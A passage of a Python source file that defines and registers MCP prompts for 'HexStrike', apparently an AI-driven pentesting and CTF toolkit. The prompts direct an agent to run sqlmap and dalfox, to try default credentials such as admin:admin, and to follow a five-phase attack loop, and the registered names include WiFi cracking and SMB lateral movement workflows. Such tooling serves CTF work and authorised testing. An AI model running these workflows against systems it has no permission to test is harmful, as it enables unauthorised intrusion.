- `call_tool("run_security_tool", tool_name="sqlmap", parameters={{"url": "...", "cookie": "PHPSESSID=..."}})`
- `call_tool("run_security_tool", tool_name="dalfox", url="...", cookie="PHPSESSID=...")`

### Key patterns
- CSRF tokens: regex from body for hidden input values
- Set `follow_redirects=false` to detect 302 redirect chains
- Forward cookies between calls: take from cookies dict → pass as cookie parameter
- Default credentials to try: admin:password, admin:admin, root:root"""
    return PromptResult(
        messages=[Message(text, role="user")],
        description="Authenticated web testing — login → session → exploit",
        meta={"version": "0.10.1"},
    )


async def pulse_dashboards(target: str = "") -> PromptResult:
    """
    Test all Pulse UI dashboards in sequence — validates ctf_dashboard(),
    pentest_report(), and recon_summary() UI entry points.
    Use after deploying new Prefab components to confirm no rendering errors.
    """
    url = target.rstrip("/") if target else "<target>"
    text = f"""## Pulse Dashboards — Validation Run

Target: {url}

Call all 3 dashboards below using `call_tool()` to validate UI rendering.
Execute them in order and confirm each one returns a visual app with no errors.

### 1 — recon_summary(target)
`call_tool("recon_summary", target="{url}")`
→ Expect: port Table (status/service/version), tech Badges (Badge per technology), DataTable with cache + history
→ Look for: icons, colored badges, table rows

### 2 — pentest_report(target)
`call_tool("pentest_report", target="{url}")`
→ Expect: findings grouped by severity in Accordion panels (expandable), Code blocks with exploit payloads, port Table
→ Look for: Accordion with clickable items, Syntax highlighted code

### 3 — ctf_dashboard()
`call_tool("ctf_dashboard")`
→ Expect: category cards (web/crypto/pwn/etc) with tool counts, BarChart coverage, Alert if no active CTF challenges
→ Look for: BarChart bars, Alert box, Badge counts

### Validation checklist
- Each returns a structured visual PrefabApp (not raw JSON or plain text)
- No pydantic validation errors (e.g. Icon(size="md") would crash)
- Icons render: shield, swords, compass
- DataTables have header columns and data rows
- No bare `except Exception: pass` — errors must be logged"""
    return PromptResult(
        messages=[Message(text, role="user")],
        description="Pulse dashboards — validate all 3 UI entry points",
        meta={"version": "0.10.1"},
    )


# ── Registration ────────────────────────────────────────────────────────


async def ctf_5phase_loop(
    target: str = "",
    challenge_type: str = "web",
) -> PromptResult:
    """
    5-phase CTF loop: Recon → Analyze → Exploit → Extract → Iterate.
    Use for CTF challenges where the first approach doesn't reveal a flag.
    Each phase is a checkpoint — if you hit a dead end, return to PHASE 1
    with new information.
    """
    type_hints = {
        "web": "http/ports/technologies → vuln scan → exploit",
        "crypto": "ciphertext analysis → cracking → decode",
        "rev": "binary entropy map → strings → decompile",
        "pwn": "service enumeration → overflow/format string → shell",
        "forensics": "file type identification → carve → analyze",
        "misc": "explore → research → connect clues",
        "osint": "passive recon → data correlation → target narrowing",
    }
    hint = type_hints.get(challenge_type, "adapt to challenge type")

    msgs = [
        Message(
            "You are in a CTF 5-phase attack loop. "
            "Each phase is a checkpoint. After each phase, assess progress. "
            "If stuck, go back to PHASE 1 with what you've learned. "
            "Never repeat the same tool twice — vary your approach."
        ),
        Message(
            f"PHASE 1 — RECON [target: {target or 'unknown'}] [{challenge_type}] [{hint}]\n"
            "Gather everything: ports, services, technology stack, files, hints. "
            "Use get_surface() for ports/tech, get_findings() for vulns, "
            "and rev_entropy_map() for binaries. "
            "Expected artifacts: port list, technology badges, entropy map.\n\n"
            "If target is unknown, use search_tools('ctf') to discover relevant tools.\n\n"
            "Use run_security_tool() for raw tools, or search_tools() + call_tool() for Pulse tools."
        ),
        Message(
            "PHASE 2 — ANALYZE\n"
            "Deep analysis of recon data. "
            "For crypto challenges: use crypto_xor_crack() on ciphertext.\n"
            "For reversing: combine rev_entropy_map() with rev_strings.\n"
            "For web: analyze http_request() responses, cookies, endpoints.\n"
            "Use crypto_z3_solve() for constraint-based puzzles.\n"
            "Expected: key derivation, vulnerability identification, attack plan."
        ),
        Message(
            "PHASE 3 — EXPLOIT\n"
            "Execute the attack. Use the tool suggested by analysis. "
            "For web: sqlmap, gobuster, nuclei -- with targeted parameters. "
            "For crypto: use the cracked key to decode the full message. "
            "For rev: focus on low-entropy regions (high-entropy = packed/encrypted). "
            "If the exploit produces unexpected output, note it and reassess."
        ),
        Message(
            "PHASE 4 — EXTRACT\n"
            "Extract the flag or artifact. "
            "Flag formats: flag{...}, CTF{...}, CTF_..., or challenge-specific. "
            "Check file contents, response headers, hidden parameters. "
            "For crypto: the flag is usually in the decoded plaintext. "
            "For rev: look for hardcoded strings or decoded payloads.\n\n"
            "Use http_request() for authenticated access if login was required. "
            "Use crypto_xor_crack(known_plaintext='flag{') for XOR'd flag files."
        ),
        Message(
            "PHASE 5 — ITERATE\n"
            "If you found a flag: submit it and confirm. "
            "If not: return to PHASE 1 with new knowledge. "
            "What did PHASE 2-4 reveal? Update your mental model. "
            "Try a different tool. Change key_length_range in xor_crack. "
            "Use different search_tools() queries.\n\n"
            "Key question: 'What information do I have now that I didn't have before?'"
        ),
    ]
    return PromptResult(
        messages=msgs,
        description=f"5-phase CTF loop: {challenge_type} on {target or 'TBD'}",
        meta={"version": "0.11.0", "phases": 5, "challenge_type": challenge_type},
    )


def register_prompts(mcp: FastMCP) -> None:
    """Register all HexStrike workflow prompts on a FastMCP server."""
    mcp.prompt(
        name="bug_bounty_recon",
        title="Bug Bounty Reconnaissance",
        tags={"recon", "web", "subdomain", "vuln-scan"},
    )(bug_bounty_recon)
    mcp.prompt(
        name="wifi_attack_chain",
        title="WiFi WPA/WPA2 Attack Chain",
        tags={"wifi", "cracking", "handshake"},
    )(wifi_attack_chain)
    mcp.prompt(
        name="smb_lateral_movement",
        title="SMB Lateral Movement",
        tags={"smb", "lateral-movement", "exploitation"},
    )(smb_lateral_movement)
    mcp.prompt(
        name="cloud_security_audit",
        title="Cloud Security Audit",
        tags={"cloud", "audit", "container", "kubernetes"},
    )(cloud_security_audit)
    mcp.prompt(
        name="ctf_web_challenge",
        title="CTF Web Challenge",
        tags={"ctf", "web"},
    )(ctf_web_challenge)
    mcp.prompt(
        name="ctf_challenge",
        title="CTF Challenge (Universal)",
        tags={"ctf", "universal"},
    )(ctf_challenge)
    mcp.prompt(
        name="authenticated_web_workflow",
        title="Authenticated Web Testing",
        tags={"web", "auth", "login", "session"},
    )(authenticated_web_workflow)
    mcp.prompt(
        name="pulse_dashboards",
        title="Pulse UI Dashboards",
        tags={"dashboard", "ctf", "pentest", "recon", "ui"},
    )(pulse_dashboards)
    mcp.prompt(
        name="ctf_5phase_loop",
        title="CTF 5-Phase Attack Loop",
        tags={"ctf", "loop", "workflow", "crypto", "rev", "pwn", "web", "forensics"},
    )(ctf_5phase_loop)
